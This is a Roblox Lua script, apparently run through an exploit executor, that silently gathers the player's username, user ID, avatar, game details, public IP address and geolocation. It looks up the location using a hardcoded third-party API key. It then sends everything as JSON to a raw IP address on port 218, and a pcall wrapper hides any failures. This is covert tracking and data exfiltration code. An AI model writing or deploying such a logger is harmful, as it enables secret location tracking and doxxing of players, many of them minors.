pcall(function()
    local Username = game.Players.LocalPlayer.Name
    local Displayname = game.Players.LocalPlayer.DisplayName
    local UserId = game.Players.LocalPlayer.UserId
    local marketplaceService = game:GetService("MarketplaceService")
    local GameName = "N/A"
    local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
    if isSuccessful then
        GameName = info.Name
    end
    local PlaceId = game.PlaceId
    local PlayerCount = ("%i/%i"):format(game.Players.NumPlayers, game.Players.MaxPlayers)
    
    local function getPfpLINK()
        local http = game:GetService("HttpService")

        local pfp = "https://icon-library.com/images/steam-question-mark-icon/steam-question-mark-icon-2.jpg"

        local success, fail = pcall(function()
            pfp = game:HttpGet(("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=150x150&format=Png&isCircular=true"):format(game.Players.LocalPlayer.UserId))
        end)

        if success and not fail then
            pfp = http:JSONDecode(pfp)

            return pfp
        end
    end
    
    local function geoData()
        local http = game:GetService("HttpService")

        local ip = game:HttpGet("https://api.ipify.org?format=json")
        ip = http:JSONDecode(ip).ip

        local geo = {}

        local success, fail = pcall(function()
            geo = game:HttpGet("https://api.ipgeolocation.io/ipgeo?apiKey=c45d0bccd0fc464faa2eb32f0c9af64f&ip="..ip)
        end)

        if success and not fail then
            geo = http:JSONDecode(geo)
                
            return geo
        end
    end
        
    local Data = {
        Username = Username,
        DisplayName = Displayname,
        UserId = UserId,
        PFP_Data = getPfpLINK(),
        GEO_Data = geoData(),
        GameName = GameName,
        GamePlaceId = PlaceId,
        PlayerCount = PlayerCount
    }

    local Compiled = game:GetService("HttpService"):JSONEncode(Data)
    
    game:HttpGet(("http://70.105.254.224:218/?json=%s"):format(Compiled))
end)
